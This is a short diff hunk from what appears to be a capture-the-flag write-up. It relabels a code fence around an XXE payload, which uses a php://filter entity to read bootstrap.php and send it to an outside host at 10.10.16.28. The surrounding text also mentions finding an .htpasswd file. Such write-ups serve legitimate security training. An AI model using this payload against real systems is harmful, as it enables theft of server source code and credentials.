@@ -182,7 +182,7 @@ After some try and error we are able to read files . Check bootstrap.php to rece
 Do it for **index.php** to get an overview and than check **bootstrap.php** which is mentioned in **index.php**  
 While poking around we also discovered **/var/www/developers/.htpasswd**  
 
-```dtd
+```http
 <!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../bootstrap.php'>
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.16.28/?file=%file;'>">
 %eval;
